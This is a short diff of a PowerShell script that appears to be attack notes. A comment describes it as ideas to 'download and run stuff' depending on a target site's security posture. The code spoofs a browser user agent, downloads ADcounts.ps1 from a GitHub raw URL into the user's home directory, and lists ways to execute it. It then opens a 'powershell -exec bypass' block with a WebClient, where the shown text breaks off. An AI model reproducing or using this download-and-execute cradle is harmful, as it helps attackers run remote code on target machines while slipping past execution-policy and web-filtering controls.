@@ -1,9 +1,14 @@
-# ideas ...
-$ua = ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.45"
-$site = "https://github.com/OnlyTheShadowKnows/AD/blob/master/ADcounts.ps1"
-$dst = "adcounts.ps1"
+# ideas ... that might work out to download and run stuff. Depends on the sec-posture o/t target site.
+
+$ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.45"
+$scr = "ADcounts.ps1"
+$site = "https://raw.githubusercontent.com/OnlyTheShadowKnows/AD/master/$scr"
+$dst = $env:HOMEDRIVE + $env:HOMEPATH + "\OSTK\" + "$scr"
+$dst
 invoke-webrequest -uri $site -UserAgent $ua -OutFile $dst
-invoke-expression -command $dst
+Get-ChildItem $dst
+#Powershell -Command "$dst"
+#$dst | invoke-expression
 
 powershell -exec bypass -command {
     $cli = New-Object System.Net.WebClient;
